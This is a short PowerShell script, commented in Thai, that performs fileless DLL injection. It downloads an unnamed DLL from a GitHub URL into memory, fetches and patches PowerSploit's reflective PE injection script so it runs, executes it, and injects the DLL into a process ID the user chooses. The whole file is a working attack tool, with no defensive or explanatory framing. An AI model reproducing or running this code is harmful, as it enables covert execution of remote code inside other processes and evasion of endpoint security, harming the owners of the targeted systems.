# inject_fileless.ps1 - ไม่มีการเขียนไฟล์ลงดิสก์

$dllUrl = "https://raw.githubusercontent.com/newgen319/xxx_x1/refs/heads/main/xxx_x1_x64.dll"

# ดาวน์โหลด DLL เข้าสู่หน่วยความจำ
Write-Host "[*] Loading DLL..." -ForegroundColor Cyan
$dllBytes = (Invoke-WebRequest -Uri $dllUrl -UseBasicParsing).Content

# ดาวน์โหลดและโหลด PowerSploit
Write-Host "[*] Loading PowerSploit..." -ForegroundColor Cyan
$ps1Content = (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" -UseBasicParsing).Content
$ps1Content = $ps1Content -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
$ps1Content = $ps1Content -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'
. ([ScriptBlock]::Create($ps1Content))

# แสดง processes
Write-Host "`n[*] Processes:" -ForegroundColor Cyan
Get-Process | Select-Object Id, ProcessName | Sort-Object Id | Format-Table -AutoSize

# รับ PID
$targetPid = Read-Host "`n[*] Enter PID"

# ฉีด
$targetProcess = Get-Process -Id $targetPid -ErrorAction SilentlyContinue
if ($targetProcess) {
    Write-Host "[*] Target: $($targetProcess.ProcessName) (PID: $targetPid)" -ForegroundColor Yellow
    Invoke-ReflectivePEInjection -PEBytes $dllBytes -ProcId $targetPid
    Write-Host "[+] Done!" -ForegroundColor Green
} else {
    Write-Host "[!] PID not found" -ForegroundColor Red
}
